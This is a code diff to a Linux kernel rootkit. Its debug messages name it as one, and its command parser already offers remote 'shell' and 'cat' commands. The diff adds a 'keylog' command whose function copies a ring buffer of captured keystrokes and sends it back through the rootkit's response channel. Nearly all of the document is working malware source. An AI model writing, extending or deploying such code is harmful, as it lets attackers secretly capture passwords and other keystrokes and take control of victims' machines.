@@ -12,8 +12,8 @@ static u32 get_arg_len(char* string) {
 
 command_t parse_command(char* data)
 {
-    char* command_strings[COMMAND_NUM] = {"shell \0", "cat \0"};
-    command_t commands[COMMAND_NUM] = {RUN, CAT};
+    char* command_strings[COMMAND_NUM] = {"shell \0", "cat \0", "keylog\0"};
+    command_t commands[COMMAND_NUM] = {RUN, CAT, KEYLOG};
     u32 i, shift, j;
 
 
@@ -145,5 +145,33 @@ void cat_command(args_t* args) {
         send_response("rootkit: error while reading\0", args);
     }
     kfree(buffer);
+
+}
+
+void keylog_command(args_t* args) {
+    char* buffer = kmalloc(KEYLOGGER_SIZE + 1, GFP_KERNEL);
+    size_t j = 0;
+    size_t i;
+
+    mutex_lock(&keylogger_mutex);
+    for (i = logger_index; i < KEYLOGGER_SIZE; i++) {
+        buffer[j] = keylogger[i];
+        j++;
+    }
+    for (i = 0; i < logger_index; i++) {
+        buffer[j] = keylogger[i];
+        j++;
+    }
+    buffer[j] = '\0';
+    mutex_unlock(&keylogger_mutex);
+
+    DEBUG_PUTS("rootkit: copied keylog\n")
+
+    send_response(buffer, args);
+
+    kfree(buffer);
+
+
+
 
 }
